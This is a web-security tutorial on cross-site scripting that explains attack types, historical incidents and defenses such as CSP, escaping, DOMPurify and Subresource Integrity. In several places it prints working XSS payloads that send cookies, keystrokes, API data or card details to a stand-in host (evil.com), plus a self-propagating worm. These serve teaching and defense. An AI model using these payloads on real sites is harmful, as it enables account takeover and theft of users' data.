# XSS Attack — Part 1 of 3

### Sections: 1 (Attacker Intuition), 2 (Why It Exists), 3 (Core Technical), 4 (Attack Flows)

**Series:** Authentication & Security → Topic 07

---

## SECTION 1 — Think Like an Attacker First

### The Attacker's Mental Model

XSS is the highest-value web attack because **it gives the attacker code execution inside the victim's browser on your domain**. Once arbitrary JavaScript runs from your origin, the attacker has everything the browser has.

```
ATTACKER'S CORE INSIGHT:

If I can inject my JavaScript into YOUR page, it runs with YOUR origin's permissions:
  * Read document.cookie (steal session tokens, user data)
  * Make authenticated API calls (via fetch/xhr — CSRF protections bypass! Same origin!)
  * Modify page DOM (fake login forms, keyloggers)
  * Exfiltrate clipboard, keystrokes, form fields
  * Redirect to phishing page
  * Load a cryptominer
  * Take screenshots (html2canvas)
  * Propagate: inject into stored content → every viewer is infected (worm)

THE KEY DIFFERENCE FROM CSRF:
  CSRF: attacker sends requests from another origin — restricted by SOP, no response read.
  XSS: attacker RUNS CODE FROM YOUR ORIGIN — SOP doesn't apply. Full browser access.

WHAT THE ATTACKER LOOKS FOR:
  1. Any place where user input is reflected back in the HTML response.
  2. Any place where user-controlled content is stored and later displayed.
  3. Any JavaScript that reads from URL (hash, query params) and inserts into DOM.
  4. API responses embedded directly into HTML without encoding.
```

### XSS Payload Examples from Real Attacks

```javascript
// MINIMAL: Just confirm execution (proof of concept)
<script>alert('XSS')</script>

// SESSION HIJACK: Send cookie to attacker's server
<script>
  fetch('https://evil.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

// SOPHISTICATED: Bypass HttpOnly (fetch authenticated API, exfiltrate data)
<script>
  // HttpOnly blocks document.cookie — but attacker can still make authenticated requests
  fetch('/api/user/profile')                          // Uses victim's session cookie
    .then(r => r.json())
    .then(data => fetch('https://evil.com/exfil', {
      method: 'POST',
      body: JSON.stringify(data)
    }));
</script>

// KEYLOGGER: Capture every keystroke including passwords
<script>
  document.addEventListener('keydown', (e) => {
    navigator.sendBeacon('https://evil.com/keys', e.key);
  });
</script>

// WORM (Samy worm pattern): Self-propagating stored XSS
<script>
  // Post the same XSS payload to the victim's profile
  fetch('/api/profile/update', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ bio: '<script>SAME_PAYLOAD<\/script>' })
  });
</script>
```

---

## SECTION 2 — Why This Exists: The Historical and Technical Problem

### The Root Cause

```
HTML is a markup language mixed with executable code (JavaScript).
Any time user-supplied text is rendered as HTML, there's a risk of execution.

EXAMPLE:
  User profile bio field.
  User types: Hello, I'm Alice!
  Stored as: "Hello, I'm Alice!"
  Rendered as: <p>Hello, I'm Alice!</p>     ← Safe.

  Attacker types: <script>alert(1)</script>
  Stored as: "<script>alert(1)</script>"
  Rendered as: <p><script>alert(1)</script></p>  ← Browser executes it!

  The browser cannot tell: "this script tag was user input, not the developer's code."
  HTML DOESN'T distinguish between developer HTML and user-supplied HTML.
  The only protection is the developer encoding user input before insertion.
```

### Real Incidents

**The Samy Worm — MySpace, 2005:**

```
Author: Samy Kamkar
Platform: MySpace (100M+ users at the time)

WHAT HAPPENED:
  MySpace allowed users to customize their profile pages with limited HTML.
  Samy found that certain CSS attribute values could execute JavaScript:
    <div style="background:url('javascript:alert(1)')">

  He embedded a stored XSS payload in his profile that:
    1. Added Samy as a friend when anyone viewed his profile
    2. Added "but most of all, samy is my hero" to viewer's profile
    3. COPIED ITSELF to the viewer's profile (worm behavior)

  Result: Within 20 hours — 1 million profiles infected.
  Fastest-spreading internet worm at the time.
  MySpace taken offline for 12 hours to clean up.
```

**British Airways Magecart Attack — 2018:**

```
Attackers: Magecart (supply chain attack group)
Breach: £183M GDPR fine (later reduced to £20M)

WHAT HAPPENED:
  BA's website loaded a third-party JavaScript file from a compromised CDN.
  The attackers injected a card-skimming XSS payload into that script:

  // Malicious code added to legitimate-looking script:
  if (document.location.href.includes('payment')) {
    document.forms[0].addEventListener('submit', function(e) {
      const data = {
        card: document.querySelector('[name=card]').value,
        cvv: document.querySelector('[name=cvv]').value,
        expiry: document.querySelector('[name=expiry]').value
      };
      fetch('https://baways.com/api/submit', { method: 'POST', body: JSON.stringify(data) });
      // Note: baways.com was the attackers' server, not britishairways.com
    });
  }

  500,000 customers: credit card data stolen over 2 weeks.
  The malicious script: loaded from baways.com (convincing lookalike domain).

  LESSON: Third-party scripts run with your origin's permissions.
          Subresource Integrity (SRI) would have caught this.
          CSP with strict script-src would have blocked baways.com.
```

**Fortnite XSS + CSRF Chain — 2019:**

```
Researcher: Check Point Research
Platform: Fortnite (350M players)
Vulnerability: XSS in a legacy EA-origin subdomain of epicgames.com

CHAIN:
  1. Attacker sends crafted link to victim
  2. Victim clicks → lands on legacy.epicgames.com (vulnerable to reflected XSS)
  3. XSS fires → running on epicgames.com origin
  4. JavaScript sends a request to accounts.epicgames.com/auth (same-site! bypasses cookies)
  5. Steals auth tokens from the OAuth flow response
  6. Full account takeover: account → linked payment methods

LESSON: Even subdomains with "no sensitive data" are XSS attack surfaces
        that can chain into full account compromise.
```

---

## SECTION 3 — Core Technical Deep Dive

### The Three Types of XSS

```
TYPE 1: STORED XSS (AKA Persistent XSS)
  Payload stored in database → served to every subsequent visitor.
  Highest impact: one attack affects all viewers.
  Examples: profile bios, comments, post content, usernames.

TYPE 2: REFLECTED XSS (AKA Non-Persistent XSS)
  Payload in URL → server reflects it in response → victim must click crafted link.
  Attack surface: search queries (?q=...), error messages, redirect URLs.
  Example:
    https://site.com/search?q=<script>alert(1)</script>
    Server renders: <p>Results for <script>alert(1)</script></p>
    Attacker sends this URL as a phishing link.

TYPE 3: DOM-BASED XSS
  Server response is safe. JS on PAGE reads a dangerous source (URL hash, location.search)
  and writes it to a dangerous sink (innerHTML, eval, document.write).
  No server involvement — static sites and SPAs are vulnerable.
  Example:
    // Vulnerable JS file (served from CDN, server response is clean):
    const name = location.hash.slice(1);  // Source: URL hash
    document.querySelector('#greeting').innerHTML = 'Hello ' + name;  // Sink: innerHTML

    Attacker URL: https://site.com/#<img src=x onerror=alert(1)>
```

### Content Security Policy (CSP)

```javascript
// THE MOST POWERFUL SERVER-SIDE DEFENSE:
// CSP tells the browser which scripts are allowed to run.

// STRICT CSP with nonces (best practice for dynamic content):

import crypto from "crypto";

function generateNonce() {
  return crypto.randomBytes(16).toString("base64"); // New nonce per request
}

app.use((req, res, next) => {
  const nonce = generateNonce();
  res.locals.cspNonce = nonce;

  res.setHeader(
    "Content-Security-Policy",
    [
      `default-src 'self'`,
      `script-src 'self' 'nonce-${nonce}'`, // Only scripts with this nonce execute
      `style-src 'self' 'nonce-${nonce}'`,
      `img-src 'self' data: https:`,
      `font-src 'self'`,
      `connect-src 'self' https://api.yoursite.com`,
      `frame-ancestors 'none'`, // Prevents clickjacking too
      `base-uri 'self'`, // Prevents <base> tag injection
      `form-action 'self'`, // Forms can only submit to your origin
      `object-src 'none'`, // No Flash, no plugins
      `upgrade-insecure-requests`, // Force HTTP → HTTPS
    ].join("; "),
  );

  next();
});

// In templates: add nonce to every script tag
// Express/EJS:
// <script nonce="<%= cspNonce %>">...</script>

// EFFECT ON XSS:
// Attacker injects: <script>alert(1)</script>
// Browser sees: script tag with no nonce
// CSP: "script-src requires 'nonce-X9mP...'" — script BLOCKED.
// Even stored XSS payloads cannot execute if nonce is required.
```

### Escaping: The Foundation of Output Encoding

```javascript
// CORE RULE: Never insert user-controlled data into HTML without encoding.
// The encoding method depends on WHERE in the HTML the data goes.

// CONTEXT 1: HTML element content
// User input: <script>alert(1)</script>
// Safe output: &lt;script&gt;alert(1)&lt;/script&gt;
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// CONTEXT 2: JavaScript variable (data embedded in JS)
function escapeForJavaScript(str) {
  return JSON.stringify(str); // JSON.stringify handles quotes, backslashes, control chars
}
// Template: var username = JSON.parse('{{userJson}}');

// CONTEXT 3: HTML attribute value
// Safe: <img alt="{{ escapeHtml(userInput) }}">
// NEVER: <img {{ userInput }}>  ← attacker can add: onerror=alert(1)

// CONTEXT 4: URL parameter
function escapeUrl(str) {
  return encodeURIComponent(str);
}

// CONTEXT 5: CSS value
// NEVER put user input into CSS. Even "safe looking" values can execute.
// background: url('...USER_INPUT...')  ← javascript: URI in older browsers

// BONUS: For React/modern SPAs — largely automatic:
// JSX: {userInput}  ← React escapes HTML automatically
// BUT: dangerouslySetInnerHTML={{ __html: userInput }}  ← NEVER use with user input
```

### DOMPurify — Allowing Rich Text Safely

```javascript
// Problem: You need to allow some HTML (bold, links) but block scripts.
// Solution: Allow-list of safe tags + DOMPurify sanitization.

import DOMPurify from "dompurify"; // Browser: use dompurify npm package
// Node.js: use isomorphic-dompurify + jsdom

// DEFAULT: strips all script tags, event handlers, data: URIs in src/href
const clean = DOMPurify.sanitize(userContent);

// CUSTOM: restrict to only specific tags
const clean = DOMPurify.sanitize(userContent, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "title"],
  // Only allow http/https URLs, not javascript: or data:
  FORCE_BODY: true,
  ALLOW_DATA_ATTR: false,
});

// REACT: inject sanitized HTML
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />;

// WRONG: DOMPurify after DOM insertion — already too late
document.getElementById("output").innerHTML = userData; // ← parse + execute happens here
const safe = DOMPurify.sanitize(userData); // ← this is now irrelevant
// CORRECT: sanitize BEFORE inserting
document.getElementById("output").innerHTML = DOMPurify.sanitize(userData);

// textContent vs innerHTML:
document.getElementById("output").textContent = userData; // ← ALWAYS safe, no HTML parsing
// Use textContent unless you NEED to render HTML. For plain text: always textContent.
```

---

## SECTION 4 — Attack Flows

### Attack Flow 1: Stored XSS via Comment System

```
SCENARIO: A forum allows users to post comments. No sanitization.

ATTACK:
  1. Attacker registers an account.
  2. Attacker posts a comment with payload:

     Nice article! <script>
       // Phase 1: Exfiltrate session cookie for HttpOnly-less cookies
       if (document.cookie) {
         fetch('https://evil.com/steal?c=' + encodeURIComponent(document.cookie));
       }
       // Phase 2: Even if HttpOnly, make authenticated API calls
       fetch('/api/user/me')
         .then(r => r.json())
         .then(d => fetch('https://evil.com/data', {
           method: 'POST', body: JSON.stringify(d)
         }));
     </script>

  3. Database stores the raw HTML including the <script> tag.
  4. Every subsequent user who views the article:
     → Browser renders the <script> tag.
     → Script executes: sends their data/token to evil.com.
     → Attacker receives credentials for hundreds or thousands of users.

  5. Admin views the comments panel:
     → Admin's privileged token / admin API access exposed.
     → Attacker now has admin-level access.
     → Full application compromise.

DEFENSE:
  At storage time: sanitize with DOMPurify or escape with escapeHtml().
  At render time: treat stored content as TEXT not HTML (use textContent / safe templates).
  HTTP headers: Content-Security-Policy blocking inline scripts.
```

### Attack Flow 2: DOM XSS via URL Fragment

```
SCENARIO: A single-page app reads the URL hash to personalize a welcome message.

VULNERABLE CODE:
  // In app.js (served via CDN — no server processing):
  const welcomeDiv = document.getElementById('welcome');
  const name = decodeURIComponent(location.hash.slice(1));  // Read from URL: #Alice
  welcomeDiv.innerHTML = 'Welcome back, ' + name + '!';    // innerHTML = XSS sink

WHY REFLECTED XSS SCANNERS MISS IT:
  The server never receives the URL hash (#).
  HTTP request: GET /app.js — server sees nothing about the hash.
  Server's response is static and clean. Traditional scanners scan server responses.
  The XSS is executed client-side only. No server request contains the payload.

ATTACK URL:
  https://yourapp.com/#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

  User receives: phishing email with this link.
  Browser decodes hash → inserts as innerHTML → onerror fires → cookie sent to evil.com.

DEFENSE:
  Replace innerHTML with textContent for any URL-derived values.
  // SAFE:
  welcomeDiv.textContent = 'Welcome back, ' + name + '!';

  OR sanitize with DOMPurify.sanitize() before innerHTML.
  CSP with strict nonce prevents onerror handlers from running external fetches.
```

### Attack Flow 3: XSS via Third-Party Script (Supply Chain)

```
SCENARIO: Your site loads a third-party analytics library.
  <script src="https://analytics.cdn.io/v3/tracker.js"></script>

WHAT'S AT RISK:
  The third-party script runs with your FULL origin's permissions.
  If analytics.cdn.io is compromised (or the library version is tampered):
  → Attacker can inject any JavaScript into YOUR page.
  → Runs as if it were your code: reads cookies (non-HttpOnly), calls your API, exfiltrates.

REAL EXAMPLE (British Airways Magecart pattern):
  1. Attacker compromises analytics.cdn.io OR intercepts the request
  2. Injects card-skimming payload into tracker.js
  3. Every user checkout: card data captured
  4. No change to your servers. No detection via server logs.

DEFENSES:
  1. SUBRESOURCE INTEGRITY (SRI):
     <script
       src="https://cdn.io/lib.js"
       integrity="sha384-<hash of exact file contents>"
       crossorigin="anonymous">
     </script>
     Browser: computes hash of downloaded file → compares with integrity attribute.
     If mismatch (file tampered): script NOT executed.
     Limitation: hash must be updated when the library version changes.

  2. CSP with strict script-src:
     Content-Security-Policy: script-src 'self' https://analytics.cdn.io 'sha384-...'
     Only listed domains can execute scripts. Unknown injected domains: blocked.

  3. Avoid third-party scripts entirely for checkout/auth pages.
     BEST: self-host critical dependencies, lock to specific versions.
```
